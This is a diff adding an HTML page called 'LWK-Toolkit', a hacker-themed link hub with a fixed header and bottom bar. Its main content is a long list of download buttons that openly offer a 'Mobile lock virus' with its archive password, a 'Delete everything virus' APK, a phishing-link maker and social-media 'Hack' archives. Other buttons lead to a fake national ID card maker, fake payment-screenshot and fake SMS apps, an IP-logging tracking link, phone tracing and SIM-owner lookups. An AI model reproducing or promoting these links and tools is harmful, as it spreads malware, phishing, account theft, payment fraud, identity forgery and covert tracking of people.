@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LWK-Toolkit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: url('https://i.ibb.co/PzGnDzRn/Screenshot-20250416-201441-2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      height: 100vh;
+      width: 100%;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: rgba(0, 0, 0, 0.7);
+      color: #0f0;
+      padding: 20px;
+      font-size: 28px;
+      font-weight: bold;
+      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 999;
+      width: 100%;
+    }
+
+    .profile-img {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      margin-right: 12px;
+      border: 2px solid #0f0;
+      box-shadow: 0 0 6px #0f0;
+    }
+
+    hr {
+      margin: 0;
+      border: 1px solid #333;
+    }
+
+    .content-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 10px;
+      margin-top: 80px; /* space for fixed header */
+      margin-bottom: 70px; /* space for fixed bottom bar */
+      -webkit-overflow-scrolling: touch; /* for smooth scrolling on iOS */
+    }
+
+    .btn {
+      display: block;
+      width: 80%;
+      max-width: 300px;
+      padding: 12px;
+      margin: 15px auto;
+      font-size: 16px;
+      font-weight: bold;
+      color: #0f0;
+      background: transparent;
+      border: 2px solid #0f0;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: inset 0 0 10px #0f0;
+      transition: all 0.3s ease-in-out;
+      text-shadow: 0 0 8px black;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .btn:hover {
+      transform: scale(1.02);
+      background: rgba(0, 255, 0, 0.1);
+      box-shadow: 0 0 15px #0f0, inset 0 0 10px #0f0;
+    }
+
+    .bottom-bar {
+      background-color: rgba(0, 0, 0, 0.7);
+      border-top: 1px solid #333;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 10px 0;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      width: 100%;
+      z-index: 999;
+    }
+
+    .bottom-btn {
+      text-align: center;
+      font-size: 14px;
+      color: #0f0;
+      flex: 1;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .bottom-btn img {
+      width: 26px;
+      height: 26px;
+      display: block;
+      margin: 0 auto 5px;
+      filter: drop-shadow(0 0 5px #0f0);
+    }
+
+    .bottom-btn span {
+      text-shadow: 0 0 5px #0f0;
+      font-weight: bold;
+    }
+    
+    /* Media queries for better responsiveness */
+    @media (max-width: 768px) {
+      .btn {
+        width: 90%;
+        font-size: 14px;
+        padding: 10px;
+      }
+      
+      header {
+        font-size: 24px;
+        padding: 15px;
+      }
+      
+      .profile-img {
+        width: 36px;
+        height: 36px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .btn {
+        width: 95%;
+        font-size: 12px;
+        margin: 10px auto;
+      }
+      
+      header {
+        font-size: 20px;
+        padding: 12px;
+      }
+      
+      .bottom-btn {
+        font-size: 12px;
+      }
+      
+      .bottom-btn img {
+        width: 22px;
+        height: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img class="profile-img" src="https://i.ibb.co/gM7Yjz8r/IMG-20250416-200959.jpg" alt="Profile">
+    LWK-Toolkit
+  </header>
+  <hr>
+
+  <div class="content-container">
+    <a href="https://Quran.com" target="_blank" class="btn">Read Quran</a>
+    <a href="https://paksimdatabse.com" target="_blank" class="btn">Sim details</a>
+    <a href="https://www.mediafire.com/file/i6dghyxuotugvml/Tiktok+For+You+Trick.pdf/file" target="_blank" class="btn">TikTok For You Trick</a>
+    <a class="btn" href="https://youtu.be/L5Mi1bONwjE?si=dRjkUQFSrn5IdyXA" target="_blank">Unlimited fake WhatsApp numbers</a>
+    <a class="btn" href="https://www.mediafire.com/file/f8shun6xzcnmy7k/WA_Number_Hide_By_AbheeBhai.zip/file" target="_blank">Whatsapp hide method</a>
+    <a class="btn" href="https://www.mediafire.com/file/ytwzd2kk0efzzat/YouTube_4k_Watchtime_Methid_By_AbheeBhai_Mods.zip/file" target="_blank">YT Watch Time method</a>
+    <a class="btn" href="https://drive.google.com/file/d/1XUfR8LP8MPkBp5Kr1dOaHMpIKnryzEat/view?usp=drivesdk" target="_blank">Tiktok USA ACC trick</a>
+    <a class="btn" href="https://www.mediafire.com/file/rvirmsr0qak96o2/tiktok_100likes_daily.zip/file" target="_blank">TIKTOK 100 likes daily</a>
+    <a class="btn" href="https://www.mediafire.com/file/ng58l6rvthowf8d/SuperVPN_PATCHED_BY_ABHEEBHAI.apk/file" target="_blank">Super vpn patch</a>
+    <a class="btn" href="https://www.mediafire.com/file/fhszbiksc8q1euh/TEAM_BLACK_HAT_MEMBERS.7z/file" target="_blank">Mobile lock virus [password: OLD HACKER]</a>
+    <a class="btn" href="https://www.mediafire.com/file/muxnfrta2y8dyq2/Modify_Any_Apk_LEAKED_By_AbheeBhai_Mods.zip/file" target="_blank">Hack Any apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/24mxw7ly49gag6x/SafeUM.apk/file" target="_blank">Safeum mod apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/ggd6xnqo4lu2bf0/MAKE_GAMES_PHISING_LINK_IN_FREE_FROM_ABHEEBHAI_MODS.zip/file" target="_blank">Game phishing maker</a>
+    <a class="btn" href="https://www.mediafire.com/file/watf6hh6jhgx995/GMAIL_WITHOUT_PHONE_NUMBERS_.zip/file" target="_blank">Unlimited Gmail without number</a>
+    <a class="btn" href="https://www.mediafire.com/file/tzsvwkgfqknutcg/Whatsapp_Hack.7z/file" target="_blank">WhatsApp Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/rsi4amf9pobui6f/Facebook_Hack.7z/file" target="_blank">Facebook Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/cdb3siibhivex8c/Instagram_Hack.7z/file" target="_blank">Instagram Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/ppezg901kv3yq0v/TikTok_Hack.7z/file" target="_blank">Tiktok Hack</a>
+    <a class="btn" href="https://wa.me/message/VBVGAKBML3HZB1" target="_blank">Tiktok Earning Paid Method</a>
+    <a class="btn" href="https://drive.google.com/file/d/17IlUQEBOOqQTMWNw4mxTuWzSfS8YM9hh/view?usp=drivesdk" target="_blank">Viral memes reel bundle</a>
+    <a class="btn" href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" target="_blank">JOIN OUR CHANNEL</a>
+    <a class="btn" href="https://www.mediafire.com/file/t9c17wlzlw5fptc/WHATSAPP_HACK_THROUGH_TERMUX_-__BY_DARK_LEGEND.mp4/file" target="_blank">Whatsapp Hack by termux</a>
+    <a href="https://wa.me/message/VBVGAKBML3HZB1" target="_blank" class="btn">Contact Owner</a>
+    <a class="btn" href="https://www.mediafire.com/file/pd5q2qavkecxun9/global_magic_bullet_location.7z/file" target="_blank">Free fire magic bullet Location</a>
+    <a class="btn" href="https://www.mediafire.com/file/t7mdrhvor0vy18m/HEADSHOT_FILE_BY_SAMI_X_SASUKA.zip/file" target="_blank">Free fire Headshot file</a>
+    <a class="btn" href="https://www.mediafire.com/file/fedpj1p5ialdxyo/XSUIT_FILE_BY_SASUKA.zip/file" target="_blank">Free fire Panel</a>
+    <a class="btn" href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" target="_blank">How to make own smm panel in free</a>
+    <a class="btn" href="https://www.imei.info/" target="_blank">IMEI Info</a>
+    <a class="btn" href="https://cnic.sims.pk/" target="_blank">Sim registration Check</a>
+    <a class="btn" href="https://excise.gos.pk/" target="_blank">Punjab Vechile check</a>
+    <a class="btn" href="https://vehicleverification.pk/" target="_blank">Sindh Vechile check</a>
+    <a class="btn" href="https://www.kpexcise.gov.pk/" target="_blank">KPK Vechile check</a>
+    <a class="btn" href="https://nims.nadra.gov.pk/nims/" target="_blank">COVID 19 Check</a>
+    <a class="btn" href="https://idcards.pw/" target="_blank">Fake Cnic maker</a>
+    <a class="btn" href="https://zefoy.com/" target="_blank">TikTok Views Trick</a>
+    <a class="btn" href="https://pakpoll.com/cnic/" target="_blank">Cnic Info</a>
+    <a class="btn" href="https://checkbill.pk/" target="_blank">All bill Check online</a>
+    <a class="btn" href="https://simdetails.com" target="_blank">Sim owner ship</a>
+    <a class="btn" href="https://grabify.link/track/HY9HN8" target="_blank">Device information</a>
+    <a class="btn" href="https://account.st/track-mobile/" target="_blank">Trace phone</a>
+    <a class="btn" href="https://www.simdetail.com/" target="_blank">Sim details 2</a>
+    <a class="btn" href="https://temp-mail.org/en/" target="_blank">Tempmil</a>
+    <a class="btn" href="https://www.mediafire.com/file/4qrvq9r98lq8xkc/Delete+everything+virus.apk/file" target="_blank">Delete Everything Apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/m6eokjktmk95zun/🔥ᴺᵁᴹᴮᴱᴿ🚯ᴮᴱᴺᴺᴱᴰ⇐༒SYCORAW࿐_1.0.apk/filew" target="_blank">WhatsApp ban unban</a>
+    <a class="btn" href="https://www.mediafire.com/file/22y2z429nnttib5/EASY+PAYSA+🔥.apk/file" target="_blank">Easypaisa Fake SS</a>
+    <a class="btn" href="https://www.mediafire.com/file/z2y7xo76zbg1716/JAZCASH+🔥.apk/file" target="_blank">Jazz Cash Fake SS</a>
+    <a class="btn" href="https://www.mediafire.com/file/s0tjqme7rfptrrl/Create_Fake_Sms.apk/file" target="_blank">Fake text msg</a>
+  </div>
+<br>
+<br>
+  <div class="bottom-bar">
+    <a href="./home" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/home.png" alt="Home">
+      <span>Home</span>
+    </a>
+    <a href="https://wa.me/923367027845" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/user.png" alt="Owner">
+      <span>Owner</span>
+    </a>
+    <a href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/whatsapp.png" alt="WhatsApp">
+      <span>WhatsApp</span>
+    </a>
+  </div>
+
+</body>
+</html>
